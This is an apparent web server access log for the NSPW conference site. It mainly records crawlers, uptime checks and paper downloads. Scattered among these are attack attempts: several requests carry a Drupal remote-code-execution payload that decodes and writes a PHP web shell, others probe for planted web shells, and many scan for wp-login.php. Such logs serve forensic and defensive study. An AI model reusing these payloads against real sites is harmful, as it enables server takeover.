131.107.174.143 - - [01/May/2018:18:44:50 -0400] "GET /2018/organizers HTTP/1.1" 200 3689 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:44:50 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:45:10 -0400] "-" 408 124 "-" "-"
131.107.174.143 - - [01/May/2018:18:45:10 -0400] "-" 408 124 "-" "-"
131.107.174.143 - - [01/May/2018:18:45:10 -0400] "-" 408 124 "-" "-"
131.107.174.143 - - [01/May/2018:18:45:10 -0400] "-" 408 124 "-" "-"
131.107.174.143 - - [01/May/2018:18:45:10 -0400] "-" 408 124 "-" "-"
69.162.124.227 - - [01/May/2018:18:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
179.254.166.128 - - [01/May/2018:18:45:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.254.166.128 - - [01/May/2018:18:45:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
167.249.209.35 - - [01/May/2018:18:46:34 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
167.249.209.35 - - [01/May/2018:18:46:36 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.19.194.19 - - [01/May/2018:18:47:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.19.194.19 - - [01/May/2018:18:47:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [01/May/2018:18:50:31 -0400] "GET /2018 HTTP/1.1" 200 6905 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:18:50:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
40.77.167.65 - - [01/May/2018:18:55:14 -0400] "GET /papers/1996/nspw1996-chuang.pdf HTTP/1.1" 200 746594 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:18:55:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.239.10.9 - - [01/May/2018:18:56:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.239.10.9 - - [01/May/2018:18:56:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.199.26.139 - - [01/May/2018:18:56:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.199.26.139 - - [01/May/2018:18:56:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
141.0.13.196 - - [01/May/2018:19:00:33 -0400] "GET /papers/1997/nspw1997-moskowitz.pdf HTTP/1.1" 200 1361490 "https://www.google.com/search?q=modeling+for+inscurity+&client=ms-opera-mini-android&channel=new&gws_rd=ssl" "Opera/9.80 (Android; Opera Mini/7.5.35721/95.90; U; en) Presto/2.12.423 Version/12.16"
69.162.124.227 - - [01/May/2018:19:00:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.200 - - [01/May/2018:19:00:54 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.70 - - [01/May/2018:19:01:35 -0400] "GET /2010/papers HTTP/1.1" 200 7767 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
88.233.89.102 - - [01/May/2018:19:03:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.233.89.102 - - [01/May/2018:19:03:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [01/May/2018:19:03:20 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.6.199 - - [01/May/2018:19:04:02 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
40.77.167.65 - - [01/May/2018:19:04:28 -0400] "GET /proceedings/2006/nspw2006-naegoe.pdf HTTP/1.1" 404 8560 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:19:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
181.90.66.158 - - [01/May/2018:19:08:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
181.90.66.158 - - [01/May/2018:19:08:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:19:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
49.145.105.94 - - [01/May/2018:19:10:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.145.105.94 - - [01/May/2018:19:10:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
59.124.153.166 - - [01/May/2018:19:12:30 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
59.124.153.166 - - [01/May/2018:19:12:30 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
105.157.247.53 - - [01/May/2018:19:13:37 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.13.86.242 - - [01/May/2018:19:13:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.13.86.242 - - [01/May/2018:19:13:53 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [01/May/2018:19:14:42 -0400] "GET /node/67 HTTP/1.1" 200 8316 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:19:14:46 -0400] "GET /2009/proceedings/1993/nspw1993-howe.pdf HTTP/1.1" 200 393339 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:19:15:21 -0400] "GET /2005/ieee.clo HTTP/1.1" 200 13278 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:19:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:19:15:40 -0400] "GET /papers/2001/nspw2001-zurko.pdf HTTP/1.1" 200 245976 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [01/May/2018:19:16:12 -0400] "GET /2017 HTTP/1.1" 200 7050 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:19:16:54 -0400] "GET /papers/2007/nspw2007-kursawe.pdf HTTP/1.1" 200 192281 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:19:18:16 -0400] "GET /2009/proceedings/2001/nspw2001-greenwald.pdf HTTP/1.1" 200 400892 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
82.102.21.230 - - [01/May/2018:19:19:45 -0400] "GET /node/70 HTTP/1.1" 200 7034 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
82.102.21.230 - - [01/May/2018:19:19:45 -0400] "GET /?q=node/add HTTP/1.1" 403 5704 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
82.102.21.230 - - [01/May/2018:19:19:45 -0400] "GET /?q=user/register HTTP/1.1" 403 5709 "https://www.nspw.org/?q=node/add" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
69.162.124.227 - - [01/May/2018:19:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.122 - - [01/May/2018:19:21:03 -0400] "GET /papers/2004/nspw2004-gates.pdf HTTP/1.1" 200 148750 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.243.113.119 - - [01/May/2018:19:21:23 -0400] "GET /s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8042 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:21:24 -0400] "GET /sites/default/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8100 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:21:24 -0400] "GET /sites/default/files/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8137 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:21:25 -0400] "GET /sites/default/files/default.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8149 "-" "python-requests/2.12.4"
66.249.73.87 - - [01/May/2018:19:24:09 -0400] "GET /current/cfp.shtml HTTP/1.1" 404 8008 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:19:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
128.110.39.93 - - [01/May/2018:19:25:40 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 200 179683 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
128.110.39.93 - - [01/May/2018:19:25:40 -0400] "GET /favicon.ico HTTP/1.1" 404 853 "https://www.nspw.org/papers/2007/nspw2007-somayaji.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
128.110.39.93 - - [01/May/2018:19:25:46 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 200 176578 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko)"
180.76.15.159 - - [01/May/2018:19:26:27 -0400] "GET /robots.txt HTTP/1.1" 200 6190 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.14 - - [01/May/2018:19:26:28 -0400] "GET /robots.txt HTTP/1.1" 200 6190 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
40.77.167.65 - - [01/May/2018:19:26:21 -0400] "GET /2009/proceedings/1997/nspw1997-mambo.pdf HTTP/1.1" 200 1057374 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.151 - - [01/May/2018:19:26:39 -0400] "GET /papers/1993/?C=M;O=A HTTP/1.1" 200 10559 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
199.59.150.183 - - [01/May/2018:19:27:31 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
76.66.92.205 - - [01/May/2018:19:28:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
76.66.92.205 - - [01/May/2018:19:28:36 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [01/May/2018:19:29:03 -0400] "GET /2017/program HTTP/1.1" 200 7340 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
160.179.109.214 - - [01/May/2018:19:29:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
160.179.109.214 - - [01/May/2018:19:29:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
152.168.110.170 - - [01/May/2018:19:30:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
152.168.110.170 - - [01/May/2018:19:30:22 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:19:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
185.243.113.119 - - [01/May/2018:19:33:20 -0400] "GET /s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8042 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:33:21 -0400] "GET /sites/default/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8100 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:33:22 -0400] "GET /sites/default/files/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8137 "-" "python-requests/2.12.4"
185.243.113.119 - - [01/May/2018:19:33:22 -0400] "GET /sites/default/files/default.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 404 8149 "-" "python-requests/2.12.4"
40.77.167.65 - - [01/May/2018:19:34:18 -0400] "GET /2009/proceedings/2002/nspw2002-capkun.pdf HTTP/1.1" 200 622994 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:19:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.27 - - [01/May/2018:19:37:02 -0400] "GET /2017/organizers HTTP/1.1" 200 14585 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.122 - - [01/May/2018:19:36:50 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 200 611376 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.124.153.166 - - [01/May/2018:19:38:05 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
35.171.8.48 - - [01/May/2018:19:39:48 -0400] "GET /papers/2007/nspw2007-locasto.pdf HTTP/1.1" 200 192547 "-" "python-requests/2.18.4"
62.202.181.215 - - [01/May/2018:19:40:03 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
62.202.181.215 - - [01/May/2018:19:40:03 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:19:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.155 - - [01/May/2018:19:41:54 -0400] "GET /user/password HTTP/1.1" 200 10421 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [01/May/2018:19:41:54 -0400] "GET /2010/program HTTP/1.1" 200 7471 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.157 - - [01/May/2018:19:42:54 -0400] "GET /proceedings HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.9 - - [01/May/2018:19:43:54 -0400] "GET /2009/proceedings/2009/?C=S;O=A HTTP/1.1" 200 7065 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.148 - - [01/May/2018:19:44:54 -0400] "GET /papers/2009/?C=M;O=D HTTP/1.1" 200 7035 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [01/May/2018:19:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
58.178.76.80 - - [01/May/2018:19:45:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
58.178.76.80 - - [01/May/2018:19:45:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.157 - - [01/May/2018:19:45:54 -0400] "GET /2015/cfp/nspw2015-cfp.pdf HTTP/1.1" 404 8004 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.23.174.51 - - [01/May/2018:19:46:39 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
71.94.177.130 - - [01/May/2018:19:46:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
71.94.177.130 - - [01/May/2018:19:46:48 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.157 - - [01/May/2018:19:46:54 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 200 1792710 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.65.108 - - [01/May/2018:19:47:09 -0400] "GET /proceedings/2013 HTTP/1.1" 200 7100 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.252 - - [01/May/2018:19:47:15 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159900 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.29 - - [01/May/2018:19:47:54 -0400] "GET /2009/proceedings/2002/nspw2002-taylor.pdf HTTP/1.1" 200 904533 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [01/May/2018:19:48:08 -0400] "GET /2009/proceedings/1998/nspw1998-foley.pdf HTTP/1.1" 200 652917 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.26 - - [01/May/2018:19:48:54 -0400] "GET /2009/proceedings/2007/nspw2007-chow.pdf HTTP/1.1" 200 420013 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [01/May/2018:19:49:03 -0400] "GET /2009/proceedings/1999/nspw1999-pancho.pdf HTTP/1.1" 200 683591 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.147 - - [01/May/2018:19:49:54 -0400] "GET /papers/2002/nspw2002-capkun.pdf HTTP/1.1" 200 622492 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [01/May/2018:19:49:53 -0400] "GET /papers/2001/nspw2001-foley.pdf HTTP/1.1" 200 722703 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:19:50:33 -0400] "GET /2009/proceedings/1999/?C=S;O=A HTTP/1.1" 200 976 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:19:50:48 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
187.113.21.52 - - [01/May/2018:19:52:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.113.21.52 - - [01/May/2018:19:52:05 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.205.179.52 - - [01/May/2018:19:52:38 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.205.179.52 - - [01/May/2018:19:52:40 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [01/May/2018:19:54:47 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 189194 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:19:55:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.17 - - [01/May/2018:20:00:00 -0400] "GET /papers/2000/nspw2000-rannenberg.pdf HTTP/1.1" 200 1059109 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [01/May/2018:20:00:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [01/May/2018:20:03:47 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
54.70.40.11 - - [01/May/2018:20:04:11 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:20:05:16 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 711802 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
114.109.48.86 - - [01/May/2018:20:05:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
114.109.48.86 - - [01/May/2018:20:05:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:20:05:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [01/May/2018:20:05:57 -0400] "GET /papers/2012/docs/p15.pdf HTTP/1.1" 200 634310 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
52.207.240.171 - - [01/May/2018:20:06:16 -0400] "GET /2018 HTTP/1.1" 200 6947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
54.70.40.11 - - [01/May/2018:20:06:17 -0400] "GET /2018 HTTP/1.1" 200 6681 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:20:06:36 -0400] "GET /2017/ HTTP/1.1" 200 6829 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:20:06:40 -0400] "GET /2013/ HTTP/1.1" 200 6573 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:20:06:41 -0400] "GET /2012/ HTTP/1.1" 200 3432 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
